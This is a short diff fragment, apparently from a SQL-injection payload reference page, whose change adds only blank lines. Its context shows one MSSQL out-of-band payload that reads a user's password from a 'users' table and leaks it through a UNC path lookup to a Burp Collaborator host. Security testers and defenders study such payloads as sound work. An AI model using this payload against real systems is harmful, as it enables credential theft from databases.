@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:22:40.529149+00:00'
 ```bash
 exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
 ```
+
+
